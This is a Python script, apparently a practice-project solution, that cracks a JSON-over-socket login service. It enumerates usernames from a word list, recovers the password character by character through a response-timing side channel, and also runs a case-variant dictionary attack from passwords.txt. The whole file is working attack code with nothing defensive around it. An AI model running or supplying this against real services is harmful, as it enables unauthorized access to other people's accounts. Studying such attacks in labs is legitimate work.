import os
import sys
import socket
import string
import itertools
import json
from datetime import datetime


def connect():
    host = args[1]
    port = int(args[2])
    # data = args[3].encode()
    address = (host, port)
    client.connect(address)


def simple_brute_force(username):  # Tries all possible letter/digit combination
    chars = string.ascii_letters + string.digits
    matched_pass = ""
    pass_len = 1
    while True:
        for char in itertools.product(chars, repeat=1):
            password = matched_pass + "".join(char)
            start_time = datetime.now()
            comp = convert_json(username, password)
            client.send(comp.encode())
            response = client.recv(1024).decode()
            result = convert_json(response=response, dump=False)
            end_time = (datetime.now() - start_time).total_seconds()
            if result == "Wrong password!":
                if end_time > 0.1:
                    matched_pass = password
            elif result == "Connection success!":
                print(comp)
                return
        if pass_len > 10:
            break
        pass_len += 1


def dictionary_brute_force(username=None, pw=None):  # Tries all login/password in the given list
    username = find_login()
    file_dir = f"{sys.path[0]}\\passwords.txt"
    with open(file_dir, "r") as file:
        word_list = file.read().split()
        for word in word_list:
            possible_cases = map("".join, itertools.product(*((c.lower(), c.upper()) for c in word)))
            for casing in possible_cases:
                comb = convert_json(username, casing)
                client.send(comb.encode())
                response = convert_json(response=client.recv(1024).decode(), dump=False)
                if response == "Connection success!":
                    print(comb)
                    return


def find_login():
    file_dir = f"{sys.path[0]}\\logins.txt"
    with open(file_dir, "r") as file:
        usernames = file.read().split()
        for username in usernames:
            client.send(convert_json(username).encode())
            response = convert_json(response=client.recv(1024).decode(), dump=False)
            if response == "Wrong password!":
                return username


def convert_json(name="", pw=None, response=None, dump=True):
    if dump:
        pw = "" if pw is None else pw
        return json.dumps({'login': name, 'password': pw})
    else:
        return json.loads(response)["result"]



args = sys.argv
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if __name__ == "__main__":
    connect()
    name = find_login()
    simple_brute_force(name)
    # dictionary_brute_force()

